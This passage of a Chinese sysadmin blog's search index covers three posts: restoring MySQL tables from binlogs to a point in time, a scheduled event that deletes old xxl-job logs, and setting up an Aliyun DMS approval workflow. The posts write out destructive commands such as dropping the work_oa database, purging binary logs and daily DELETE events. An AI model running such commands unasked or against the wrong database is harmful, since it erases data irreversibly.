mysql 或 mysqldump 的操作 iptables -I INPUT -s 127.0.0.1/32 -p tcp --dport 12530 -j ACCEPT 三、解析binlog\n我们需要把重放日志拿出来：\nmysqlbinlog --start-datetime=\u0026#34;2025-01-02 14:40:00\u0026#34; --stop-datetime=\u0026#34;2025-01-02 14:50:00\u0026#34; --verbose binlog.000009 |grep -i -C15 \u0026#34;drop table\u0026#34;|more mysqlbinlog binlog.000009 --stop-position=260734003 --database=work_oa \u0026gt; 9.sql 注意，分析：看到 at 260734003 下面有个 drop table ，说明是在 260734003 之后发生了 drop table 操作 所以，回放到260734003就可以了。之后、之后、之后才操作的！！！ /*!80014 SET @@session.original_server_version=80019*//*!*/; /*!80014 SET @@session.immediate_server_version=80019*//*!*/; SET @@SESSION.GTID_NEXT= \u0026#39;ANONYMOUS\u0026#39;/*!*/; # at 260734003 #200311 20:06:20 server id 1 end_log_pos 355 CRC32 0x2fc1e5ea Query\tthread_id=16\texec_time=0\terror_code=0 SET TIMESTAMP=1583971580/*!*/; SET @@session.pseudo_thread_id=16/*!*/; SET @@session.foreign_key_checks=1, @@session.sql_auto_is_null=0, @@session.unique_checks=1, @@session.autocommit=1/*!*/; SET @@session.sql_mode=1168113696/*!*/; SET @@session.auto_increment_increment=1, @@session.auto_increment_offset=1/*!*/; /*!\\C utf8mb4 *//*!*/; SET @@session.character_set_client=255,@@session.collation_connection=255,@@session.collation_server=255/*!*/; SET @@session.lc_time_names=0/*!*/; SET @@session.collation_database=DEFAULT/*!*/; /*!80011 SET @@session.default_collation_for_utf8mb4=255*//*!*/; DROP TABLE `pets`.`cats` /* generated by server */ /*!*/; # at 260734009 #200311 20:07:48 server id 1 end_log_pos 434 CRC32 0x123d65df Anonymous_GTID\tlast_committed=1\tsequence_number=2\trbr_only=no\toriginal_committed_timestamp=1583971668462467\timmediate_commit_timestamp=1583971668462467\ttransaction_length=473 # original_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT) # immediate_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT) /*!80001 SET @@session.original_commit_timestamp=1583971668462467*//*!*/; /*!80014 SET @@session.original_server_version=80019*//*!*/; /*!80014 SET @@session.immediate_server_version=80019*//*!*/; SET @@SESSION.GTID_NEXT= \u0026#39;ANONYMOUS\u0026#39;/*!*/; # at 260734188 #200311 20:07:48 server id 1 end_log_pos 828 CRC32 0x57fac9ac Query\tthread_id=16\texec_time=0\terror_code=0\tXid = 217 use `pets`/*!*/; SET TIMESTAMP=1583971668/*!*/; /*!80013 SET @@session.sql_require_primary_key=0*//*!*/; CREATE TABLE dogs 我们还是先找到 binlog 中 drop table 之类的操作字样，然后确定 position 后，把 binlog.00009 中之前的 log 导出。\n别忘记了， 前面还有8个binlog\nmysqlbinlog -d work_oa binlog.000001 \u0026gt; 1.sql mysqlbinlog -d work_oa binlog.000002 \u0026gt; 2.sql mysqlbinlog -d work_oa binlog.000003 \u0026gt; 3.sql mysqlbinlog -d work_oa binlog.000004 \u0026gt; 4.sql mysqlbinlog -d work_oa binlog.000005 \u0026gt; 5.sql mysqlbinlog -d work_oa binlog.000006 \u0026gt; 6.sql mysqlbinlog -d work_oa binlog.000007 \u0026gt; 7.sql mysqlbinlog -d work_oa binlog.000008 \u0026gt; 8.sql 然后还要看 *.sql 的大小，发现都是1.7G，1.6G\n四、恢复\n注意上一节关注的文件大小。我们需要修改2个地方：\n1、服务器，binlog导出的文件，导入服务器的时候数据包会非常大，所以1.7G文件，最好放大到2G\ncat /etc/my.cnf [mysqld] max_allowed_packet=2048M 2、客户端导入\n# 因为是直接在老库上操作，所以必须先干掉库 drop database work_oa # 恢复 mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 1.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 2.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 3.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 4.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 5.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 6.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 7.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 8.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 9.sql 这样就恢复完了。如果是在阿里云，那就是恢复到了一个新实例的新库里，然后在把库表导出，再导入到老库中，就是一个完美的恢复了。\n善后事宜：\n一定要做个full backup：\nmysqldump -uroot -p -h 127.0.0.1 -P3306 --opt --triggers -R --hex-blob --single-transaction --flush-logs --master-data=2 --all-databases \u0026gt; all-20250103.sql 做完后查看 all-20250103.sql\n说明这个备份是从 binlog.000031 开始的，之前的都可以不要了，so，删除之前的，只保留000031之后的：\nPURGE BINARY LOGS TO \u0026#39;binlog.000031\u0026#39;; ","permalink":"https://rendoumi.com/posts/20250103-msyql_restore/","summary":"\u003cp\u003e同事上线，把数据库初始化脚本改了名。结果导致上线把库表的数据全给重新初始化了。这下事来了，恢复库表。\u003c/p\u003e\n\u003cp\u003e之前用过阿里云的库表恢复，非常简洁，那这次也照猫画虎学一回，步骤如下：\u003c/p\u003e\n\u003cp\u003e一、保存现在的记录：\u003c/p\u003e\n\u003cp\u003e把所有相关的binlog拷贝到一个备份目录保存。\u003c/p\u003e\n\u003cp\u003e二、最好新建一个mysql实例：\u003c/p\u003e\n\u003cp\u003e阿里确实事新起了一个实例，避免操作对旧实例造成影响。\u003c/p\u003e\n\u003cp\u003e我们实战中可能没必要，但也要封锁数据库的读写：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -I INPUT -p tcp --dport \u003cspan class=\"m\"\u003e3306\u003c/span\u003e -j DROP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 把自己放通，后续可能自己要进行 mysql 或 mysqldump 的操作\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -I INPUT -s 127.0.0.1/32 -p tcp --dport \u003cspan class=\"m\"\u003e12530\u003c/span\u003e -j ACCEPT\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三、解析binlog\u003c/p\u003e\n\u003cp\u003e我们需要把重放日志拿出来：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqlbinlog --start-datetime\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;2025-01-02 14:40:00\u0026#34;\u003c/span\u003e --stop-datetime\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;2025-01-02 14:50:00\u0026#34;\u003c/span\u003e --verbose binlog.000009 \u003cspan class=\"p\"\u003e|\u003c/span\u003egrep -i -C15 \u003cspan class=\"s2\"\u003e\u0026#34;drop table\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003emore\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqlbinlog binlog.000009 --stop-position\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e260734003\u003c/span\u003e --database\u003cspan class=\"o\"\u003e=\u003c/span\u003ework_oa \u0026gt; 9.sql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e注意，分析：看到 at \u003cspan class=\"m\"\u003e260734003\u003c/span\u003e 下面有个 drop table ，说明是在 \u003cspan class=\"m\"\u003e260734003\u003c/span\u003e 之后发生了 drop table 操作\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e所以，回放到260734003就可以了。之后、之后、之后才操作的！！！\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80014 SET @@session.original_server_version\u003cspan class=\"o\"\u003e=\u003c/span\u003e80019*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80014 SET @@session.immediate_server_version\u003cspan class=\"o\"\u003e=\u003c/span\u003e80019*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@SESSION.GTID_NEXT\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ANONYMOUS\u0026#39;\u003c/span\u003e/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# at 260734003\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#200311 20:06:20 server id 1  end_log_pos 355 CRC32 0x2fc1e5ea \tQuery\tthread_id=16\texec_time=0\terror_code=0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET \u003cspan class=\"nv\"\u003eTIMESTAMP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1583971580/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.pseudo_thread_id\u003cspan class=\"o\"\u003e=\u003c/span\u003e16/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.foreign_key_checks\u003cspan class=\"o\"\u003e=\u003c/span\u003e1, @@session.sql_auto_is_null\u003cspan class=\"o\"\u003e=\u003c/span\u003e0, @@session.unique_checks\u003cspan class=\"o\"\u003e=\u003c/span\u003e1, @@session.autocommit\u003cspan class=\"o\"\u003e=\u003c/span\u003e1/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.sql_mode\u003cspan class=\"o\"\u003e=\u003c/span\u003e1168113696/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.auto_increment_increment\u003cspan class=\"o\"\u003e=\u003c/span\u003e1, @@session.auto_increment_offset\u003cspan class=\"o\"\u003e=\u003c/span\u003e1/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!\u003cspan class=\"se\"\u003e\\C\u003c/span\u003e utf8mb4 *//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.character_set_client\u003cspan class=\"o\"\u003e=\u003c/span\u003e255,@@session.collation_connection\u003cspan class=\"o\"\u003e=\u003c/span\u003e255,@@session.collation_server\u003cspan class=\"o\"\u003e=\u003c/span\u003e255/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.lc_time_names\u003cspan class=\"o\"\u003e=\u003c/span\u003e0/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@session.collation_database\u003cspan class=\"o\"\u003e=\u003c/span\u003eDEFAULT/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80011 SET @@session.default_collation_for_utf8mb4\u003cspan class=\"o\"\u003e=\u003c/span\u003e255*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDROP TABLE \u003cspan class=\"sb\"\u003e`\u003c/span\u003epets\u003cspan class=\"sb\"\u003e`\u003c/span\u003e.\u003cspan class=\"sb\"\u003e`\u003c/span\u003ecats\u003cspan class=\"sb\"\u003e`\u003c/span\u003e /* generated by server */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# at 260734009\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#200311 20:07:48 server id 1  end_log_pos 434 CRC32 0x123d65df \tAnonymous_GTID\tlast_committed=1\tsequence_number=2\trbr_only=no\toriginal_committed_timestamp=1583971668462467\timmediate_commit_timestamp=1583971668462467\ttransaction_length=473\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# original_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# immediate_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80001 SET @@session.original_commit_timestamp\u003cspan class=\"o\"\u003e=\u003c/span\u003e1583971668462467*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80014 SET @@session.original_server_version\u003cspan class=\"o\"\u003e=\u003c/span\u003e80019*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80014 SET @@session.immediate_server_version\u003cspan class=\"o\"\u003e=\u003c/span\u003e80019*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET @@SESSION.GTID_NEXT\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ANONYMOUS\u0026#39;\u003c/span\u003e/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# at 260734188\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#200311 20:07:48 server id 1  end_log_pos 828 CRC32 0x57fac9ac \tQuery\tthread_id=16\texec_time=0\terror_code=0\tXid = 217\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euse \u003cspan class=\"sb\"\u003e`\u003c/span\u003epets\u003cspan class=\"sb\"\u003e`\u003c/span\u003e/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET \u003cspan class=\"nv\"\u003eTIMESTAMP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1583971668/*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/*!80013 SET @@session.sql_require_primary_key\u003cspan class=\"o\"\u003e=\u003c/span\u003e0*//*!*/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCREATE TABLE dogs\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们还是先找到 binlog 中  drop table 之类的操作字样，然后确定 position 后，把 binlog.00009 中之前的 log 导出。\u003c/p\u003e","title":"Mysql的某个表恢复到某一个时间点的操作"},{"content":"xxl-job的日志数据实在是太大了，压根就没有清理过，设置一个定时任务来定时删除无用的废数据吧：\n首先要确认定时任务开关已经打开了\nshow variables like \u0026#39;event_scheduler\u0026#39;; On表示开启 然后到指定的库下，use k8s_xxl_job\nCREATE EVENT delete_k8s_xxl_log ON SCHEDULE EVERY 1 DAY DO DELETE FROM xxl_job_log WHERE trigger_time \u0026lt; CURRENT_TIMESTAMP - INTERVAL 7 DAY; 保留今天的数据，以及前7天的老数据。 查看以及编辑定时任务的命令：\n#查看 show events; #查看细节 SHOW CREATE EVENT delete_k8s_xxl_log #编辑 ALTER EVENT delete_k8s_xxl_log ON SCHEDULE EVERY 1 DAY DO BEGIN -- 在这里添加你想要执行的操作 END; ","permalink":"https://rendoumi.com/posts/20240320-mysql_delete_xxllog/","summary":"\u003cp\u003exxl-job的日志数据实在是太大了，压根就没有清理过，设置一个定时任务来定时删除无用的废数据吧：\u003c/p\u003e\n\u003cp\u003e首先要确认定时任务开关已经打开了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow variables like \u003cspan class=\"s1\"\u003e\u0026#39;event_scheduler\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eOn表示开启\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后到指定的库下，\u003ccode\u003euse k8s_xxl_job\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCREATE EVENT delete_k8s_xxl_log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eON SCHEDULE EVERY \u003cspan class=\"m\"\u003e1\u003c/span\u003e DAY\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDO\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDELETE FROM xxl_job_log WHERE trigger_time \u0026lt; CURRENT_TIMESTAMP - INTERVAL \u003cspan class=\"m\"\u003e7\u003c/span\u003e DAY\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e保留今天的数据，以及前7天的老数据。\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e查看以及编辑定时任务的命令：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#查看\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow events\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#查看细节\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSHOW CREATE EVENT delete_k8s_xxl_log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#编辑\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eALTER EVENT delete_k8s_xxl_log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eON SCHEDULE EVERY \u003cspan class=\"m\"\u003e1\u003c/span\u003e DAY\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDO\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBEGIN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -- 在这里添加你想要执行的操作\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEND\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"设置Mysql自动定时删除xxljob的日志数据"},{"content":"其实我们用的是yearning来管理 MySQL 数据库变更需求的，但是，类似 Oracle 或者 PolarDB，就用不成了。\n这事只能交给阿里云的dms来管理了，其实dms要比yearning强大很多，可以精确控制到表的行级别权限的。\n理由就是dms是个web页面，代理连接到后端的数据库，所以要显示什么，不要显示什么，从web界面是完全可以控制的。实际到数据库级别反而有的是控制不住的。\n这就梳理一下建立审批流的步骤：\n一、dms同步ram用户 ram用户是管理的基础了，这些用户必须先行导入dms，我们才能进一步赋予owner，DBA的权限\n用户管理\u0026ndash;\u0026gt;同步子账号，选择要dms要使用的账号同步过来即可\n二、设定实例DBA DMS里的权限是这样的：库的话有Owner，然后实例的话有DBA，最上是管理员。\n那么一个实例里有几万张表，没人会想一个一个点击赋Owner的权限吧。\n那就粗分一下，一个人对整个实例有权限审批即可。这样要先设定整个实例的DBA角色。\n我们先编辑用户，让他有DBA的角色，以供之后在实例级别可以选择他\n然后去实例管理里面：\n选择实例的右边，更多\u0026ndash;\u0026gt;编辑实例\n实例的账号、密码、安全协同、安全规则都选上，然后高级信息里，实例DBA就可以选择刚才设置了DBA角色的人了\n三、设置审批流程 然后去安全与规范，审批流程，新增审批模板，来自定义审批流\n我们公司的审批流不是380缺省那个，380是需要三个人审批的：\n我们的链路就很建单了，有操作权限的人找实例的DBA审批，然后过最高管理员批就完了，所以做如下的流程：\n四、设置安全规则 我们再到安全与规范，点击安全规则，找到具体实例里设置的 强管控模式 for MySQL\n可以看到已经有2个实例用上了，然后到右边，点击编辑：\n最主要的就是SQL变更，数据变更默认审批模板的设置，我们改成我们自己的审批流即可\n其他的选项都可以按需进行修改。\n五、设置用户权限 如上审批流就完成了，我们要登录具体的实例列表，再更多里设置权限\n注意上面是设置的实例级别的权限。\n如果要设置更细级别的库、表、行权限，需要点击数据库列表\n在这里面的表详情的右边更多，可以控制库、表、行的权限\n这样就可以弄完整个流程了。\n","permalink":"https://rendoumi.com/posts/20240305-aliyun_dms/","summary":"\u003cp\u003e其实我们用的是yearning来管理 MySQL 数据库变更需求的，但是，类似 Oracle 或者 PolarDB，就用不成了。\u003c/p\u003e\n\u003cp\u003e这事只能交给阿里云的dms来管理了，其实dms要比yearning强大很多，可以精确控制到表的行级别权限的。\u003c/p\u003e\n\u003cp\u003e理由就是dms是个web页面，代理连接到后端的数据库，所以要显示什么，不要显示什么，从web界面是完全可以控制的。实际到数据库级别反而有的是控制不住的。\u003c/p\u003e\n\u003cp\u003e这就梳理一下建立审批流的步骤：\u003c/p\u003e\n\u003ch4 id=\"一dms同步ram用户\"\u003e一、dms同步ram用户\u003c/h4\u003e\n\u003cp\u003eram用户是管理的基础了，这些用户必须先行导入dms，我们才能进一步赋予owner，DBA的权限\u003c/p\u003e\n\u003cp\u003e用户管理\u0026ndash;\u0026gt;同步子账号，选择要dms要使用的账号同步过来即可\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305163935106\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305163935106.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"二设定实例dba\"\u003e二、设定实例DBA\u003c/h4\u003e\n\u003cp\u003eDMS里的权限是这样的：库的话有Owner，然后实例的话有DBA，最上是管理员。\u003c/p\u003e\n\u003cp\u003e那么一个实例里有几万张表，没人会想一个一个点击赋Owner的权限吧。\u003c/p\u003e\n\u003cp\u003e那就粗分一下，一个人对整个实例有权限审批即可。这样要先设定整个实例的DBA角色。\u003c/p\u003e\n\u003cp\u003e我们先编辑用户，让他有DBA的角色，以供之后在实例级别可以选择他\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305164233341\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305164233341.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后去实例管理里面：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305164150203\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305164150203.png\"\u003e\u003c/p\u003e\n\u003cp\u003e选择实例的右边，更多\u0026ndash;\u0026gt;编辑实例\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305164629786\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305164629786.png\"\u003e\u003c/p\u003e\n\u003cp\u003e实例的账号、密码、安全协同、安全规则都选上，然后高级信息里，实例DBA就可以选择刚才设置了DBA角色的人了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305164843708\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305164843708.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305164811202\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305164811202.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"三设置审批流程\"\u003e三、设置审批流程\u003c/h4\u003e\n\u003cp\u003e然后去安全与规范，审批流程，新增审批模板，来自定义审批流\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305165022278\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305165022278.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们公司的审批流不是380缺省那个，380是需要三个人审批的：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305165111340\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305165111340.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们的链路就很建单了，有操作权限的人找实例的DBA审批，然后过最高管理员批就完了，所以做如下的流程：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305165212283\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305165212283.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"四设置安全规则\"\u003e四、设置安全规则\u003c/h4\u003e\n\u003cp\u003e我们再到安全与规范，点击安全规则，找到具体实例里设置的 强管控模式 for MySQL\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305165325268\" loading=\"lazy\" 